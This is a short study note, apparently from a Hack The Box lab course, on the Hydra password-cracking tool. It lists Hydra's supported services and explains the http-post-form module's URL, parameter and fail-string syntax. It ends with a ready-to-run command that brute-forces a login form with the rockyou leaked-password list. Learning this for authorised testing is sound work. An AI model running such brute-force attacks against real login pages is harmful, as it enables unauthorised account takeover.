---
title: d-Hydra Modules
draft: false
tags:
  - hydra
  - http-post-form
---
## Brute Forcing Forms

To list supported services:

```shell-session
jadu101@htb[/htb]$ hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e

Supported			        ldap3[-{cram|digest}md5][s]	rsh
services			        memcached					rtsp
				            mongodb						s7-300
adam6500			        mssql						sip
asterisk			        mysql						smb
cisco				        nntp						smtp[s]
cisco-enable		        oracle-listener				smtp-enum
cvs				            oracle-sid					snmp
firebird			        pcanywhere					socks5
ftp[s]				        pcnfs						ssh
http[s]-{head|get|post}		pop3[s]						sshkey
http[s]-{get|post}-form		postgres					svn
http-proxy		        	radmin2						teamspeak
http-proxy-urlenum		    rdp				  		    telnet[s]
icq				            redis						vmauthd
imap[s]		        		rexec						vnc
irc				            rlogin						xmpp
ldap2[s]		        	rpcap
```

1. `http[s]-{head|get|post}`
2. `http[s]-post-form`

The 1st module serves for basic HTTP authentication, while the 2nd module is used for login forms, like `.php` or `.aspx` and others.

If we recognize that any of our input was pasted into the `URL`, the web application uses a `GET` form. Otherwise, it uses a `POST` form.

In summary, we need to provide three parameters, separated by `:`, as follows:

1. `URL path`, which holds the login form
2. `POST parameters` for username/password
3. `A failed/success login string`, which lets hydra recognize whether the login attempt was successful or not

For fail/success, We can specify two different types of analysis that act as a Boolean value.

|**Type**|**Boolean Value**|**Flag**|
|---|---|---|
|`Fail`|FALSE|`F=html_content`|
|`Success`|TRUE|`S=html_content`|



```shell-session
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

